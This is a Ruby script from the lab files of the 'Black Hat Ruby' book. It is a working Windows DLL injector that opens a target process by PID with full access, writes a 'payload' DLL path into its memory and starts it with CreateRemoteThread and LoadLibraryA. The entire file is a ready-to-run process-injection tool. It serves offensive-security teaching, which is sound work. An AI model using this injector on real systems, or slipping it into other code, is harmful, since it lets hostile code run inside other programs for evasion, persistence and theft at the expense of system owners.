#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   DLL injector script uses CreateRemoteThread technique
#   Make sure that your payload (dll) architecture matches Ruby architecture
#   - eg. If your Ruby architecture is x64, the payload must be x64 too
# Requirements:
#   Windows OS
# 
unless Gem.win_platform?
  puts "[!] This script runs only on Windows OS!"
  exit!
end

require 'fiddle'
require 'fiddle/import'
require 'fiddle/types'
require 'optionparser'

options = {}
option = OptionParser.new
option.banner = "DLL Injector – Ruby Script to inject a dll into process.\n\n"
option.on('-p', '--process-id [PID]',   'Process ID (PID)') {|v| options[:pid] = v || ''}
option.on('-d', '--dll [FILE]',  'dll file to inject')      {|v| options[:dll] = v || ''}
option.on_tail  "Usage: dllinjection.rb -p PID -d file.dll"
option.parse! ARGV

if options[:pid].nil? || options[:dll].nil?
  puts option
  exit!
end

pid = options[:pid].to_i
dll = File.absolute_path(options[:dll])

include Fiddle

# The handler in x64 is longer so we had to change its time to TYPE_LONG_LONG
if RUBY_PLATFORM.include?("x64")
  puts "[+] Ruby architecture is: x64"
  @arch_int = Fiddle::TYPE_LONG_LONG
elsif RUBY_PLATFORM.include?("i386")
  puts "[+] Ruby architecture is: x86"
  @arch_int = Fiddle::TYPE_INT
else
  puts "[!] Unknown architecture."
  puts RUBY_PLATFORM
end

PAGE_READWRITE     = 0x04
PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM        = ( 0x1000 | 0x2000 )
MEM_COMMIT         = 0x1000 
MEM_RELEASE        = 0x8000

# Get the process name(absolute path) from process ID
# 
# DWORD GetModuleFileNameExA(
#   HANDLE  hProcess,
#   HMODULE hModule,
#   LPSTR   lpFilename,
#   DWORD   nSize
# );
psapi = Fiddle.dlopen('Psapi.dll')
get_proc_name = Function.new(psapi['GetModuleFileNameExA'], [TYPE_INT, TYPE_VOIDP, TYPE_VOIDP, TYPE_VOIDP], TYPE_VOIDP)
procbuf       = Pointer.malloc(dll.size + 200)
procbufmax    = 50000

kernel32 = Fiddle.dlopen('kernel32')

# Open a handle to the process we are injecting into.
# 
# HANDLE OpenProcess(
#   DWORD dwDesiredAccess,
#   BOOL  bInheritHandle,
#   DWORD dwProcessId
# );
# puts "[+] OpenProcess - PID: #{pid}"
open_process = Function.new(kernel32['OpenProcess'], [TYPE_VOIDP, TYPE_VOID, TYPE_VOIDP], TYPE_VOIDP)
hprocess     = open_process.call(PROCESS_ALL_ACCESS, false, pid)
proc_path    = get_proc_name.call(hprocess, 0, procbuf, procbufmax)
ptr          = hprocess.inspect.scan(/0x[\h]+/i)[1]
puts "[+] OpenProcess - PID: #{File.basename(procbuf.to_str.gsub("\000", ''))} (#{pid})"
puts "[>]   address: #{ptr}"

# Allocate memory space for the DLL path in the target process,
# length of the path string + null terminator
# 
# LPVOID WINAPI VirtualAllocEx(
#   _In_     HANDLE hProcess,
#   _In_opt_ LPVOID lpAddress,
#   _In_     SIZE_T dwSize,
#   _In_     DWORD  flAllocationType,
#   _In_     DWORD  flProtect
# );
puts "[+] VirtualAllocEx - #{dll.size}-bytes"
arg_address = Function.new(kernel32['VirtualAllocEx'], [TYPE_INT, TYPE_VOIDP, TYPE_VOIDP, TYPE_VOIDP, TYPE_VOIDP], TYPE_VOIDP)
hdllpath = arg_address.call(hprocess, 0, dll.size, VIRTUAL_MEM, PAGE_READWRITE) 
ptr = hdllpath.inspect.scan(/0x[\h]+/i)[1]
puts "[>]   address: #{ptr}"

# Write the DLL path into the allocated space(address) of the memory we just allocated
# 
# BOOL WINAPI WriteProcessMemory(
#   _In_  HANDLE  hProcess,
#   _In_  LPVOID  lpBaseAddress,
#   _In_  LPCVOID lpBuffer,
#   _In_  SIZE_T  nSize,
#   _Out_ SIZE_T  *lpNumberOfBytesWritten
# );
puts "[+] WriteProcessMemory - "
write_process_memory = Function.new(kernel32['WriteProcessMemory'], [TYPE_INT, TYPE_VOIDP, TYPE_VOIDP, TYPE_VOIDP, TYPE_VOIDP], TYPE_VOIDP)
write_process_memory.call(hprocess, hdllpath, dll, dll.size, 0)
ptr = write_process_memory.inspect.scan(/0x[\h]+/i)[1]
puts "[>]   address: #{ptr}" unless ptr.nil?

# We need to resolve the address for LoadLibraryA
# 
# HMODULE WINAPI LoadLibrary(
#   _In_ LPCTSTR lpFileName
# );
puts "[+] LoadLibraryA"
h_kernel32 = Function.new(kernel32['GetModuleHandleA'], [TYPE_VOIDP], TYPE_VOIDP).call('kernel32.dll')
h_loadlibrarya = Function.new(kernel32['GetProcAddress'], [@arch_int, TYPE_VOIDP], TYPE_VOIDP).call(h_kernel32, 'LoadLibraryA')
ptr = h_loadlibrarya.inspect.scan(/0x[\h]+/i)[1]
puts "[>]   address: #{ptr}"

# Now we try to create the remote thread, with the entry point set
# to LoadLibraryA and a pointer to the DLL path as it's single parameter
# 
# HANDLE CreateRemoteThread(
#   HANDLE                 hProcess,
#   LPSECURITY_ATTRIBUTES  lpThreadAttributes,
#   SIZE_T                 dwStackSize,
#   LPTHREAD_START_ROUTINE lpStartAddress,
#   LPVOID                 lpParameter,
#   DWORD                  dwCreationFlags,
#   LPDWORD                lpThreadId
# );
puts "[+] CreateRemoteThread"
create_remote_thread = Function.new(kernel32['CreateRemoteThread'], [@arch_int, TYPE_VOIDP, TYPE_VOIDP, @arch_int, @arch_int, TYPE_VOIDP, TYPE_VOIDP], TYPE_VOIDP)
thread = create_remote_thread.call(hprocess, 0, 0, h_loadlibrarya.to_i, hdllpath, 0, 0)
ptr = thread.inspect.scan(/0x[\h]+/i)[1]
puts "[>]   address: #{ptr}"

# Wait for the execution of the loader thread to finish
# 
# DWORD WaitForSingleObject(
#   HANDLE hHandle,
#   DWORD  dwMilliseconds
# );
puts "[+] WaitForSingleObject"
Function.new(kernel32['WaitForSingleObject'], [TYPE_INT, TYPE_INT], TYPE_INT).call(thread, -1)

# Free the meory allocated for our dll path
# 
# BOOL WINAPI VirtualFreeEx(
#   _In_ HANDLE hProcess,
#   _In_ LPVOID lpAddress,
#   _In_ SIZE_T dwSize,
#   _In_ DWORD  dwFreeType
# );
puts "[+] VirtualFreeEx"
virtual_free_ex = Function.new(kernel32['VirtualFreeEx'], [@arch_int, @arch_int, @arch_int, @arch_int], TYPE_INT)
virtual_free_ex.call(hprocess, hdllpath, hdllpath, MEM_RELEASE)

# Close the process handle
# BOOL WINAPI CloseHandle(
#   _In_ HANDLE hObject
# );
puts "[+] CloseHandle - PID: #{pid}"
Function.new(kernel32['CloseHandle'], [@arch_int], TYPE_INT).call(hprocess)
